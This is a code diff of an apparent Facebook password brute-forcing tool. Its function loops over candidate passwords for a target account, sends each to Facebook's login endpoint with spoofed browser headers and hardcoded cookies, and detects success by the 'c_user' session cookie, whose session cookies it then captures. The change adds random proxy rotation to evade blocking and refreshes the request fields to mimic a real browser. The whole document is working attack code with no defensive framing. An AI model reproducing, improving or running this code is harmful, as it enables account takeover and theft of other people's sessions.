@@ -1226,67 +1226,46 @@ def mbasic(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'api_key': '449838951736891',
-            'cancel_url': 'https://auth.opera.com/account/social/v4/callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=WNahsU1RWERN7c2kB19ybSBubJJbYt#_=_',
-            'display': 'page',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '1',
-            'signed_next': '1',
-            'trynum': '1',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '100014_t20R',
-            'lgnjs': '1732989615',
             'email': uid,
-            'prefill_contact_point': '',
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'password',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'true',
-            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAfAAAAAAAAAAAAAAAAAAP/vPPffPAABFAL',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw)}
+            'login_source': 'comet_headerless_login',
+            'next': '',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'datr': 'DQQ-Z3Sl1kkwp5eJPjAonnEo',
-            'sb': 'DQQ-Z2ztbMJmdxyVIlGZ0ZEN',
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnS132.AWWwafGKWUY',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
             'ps_l': '1',
             'ps_n': '1',
-            'locale': 'en_GB',
-            'fr': '0c3x4NhqzBoN0oJpn.AWWV8F980sRicDtaHFFGFQEKhCw.BnPBZf..AAA.0.0.BnS1Ku.AWXmjKFQa8k',
-            'wd': '995x773',}
+            'usida': 'eyJ2ZXIiOjEsImlkIjoiQXNuczFldjF2YXZ1bHYiLCJ0aW1lIjoxNzMyOTkyMjk1fQ^%^3D^%^3D',}
             headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=449838951736891&kid_directed_site=0&app_id=449838951736891&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.12%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D449838951736891%26redirect_uri%3Dhttps%253A%252F%252Fauth.opera.com%252Faccount%252Fsocial%252Fv4%252Fcallback%26scope%3Demail%26state%3DWNahsU1RWERN7c2kB19ybSBubJJbYt%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1fd7fa3b-14b0-4263-95e2-bc18735b0567%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.opera.com%2Faccount%2Fsocial%2Fv4%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DWNahsU1RWERN7c2kB19ybSBubJJbYt%23_%3D_&display=page&locale=en_GB&pl_dbl=0',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.86", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            'viewport-width': '995',}
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Referer': 'https://www.facebook.com/',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.facebook.com',
+            'DNT': '1',
+            'Alt-Used': 'www.facebook.com',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Priority': 'u=0, i',
+            'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
-            po = Session.post(url, cookies=cookies, data=data, headers=headers).text
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False, proxies=proxs).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
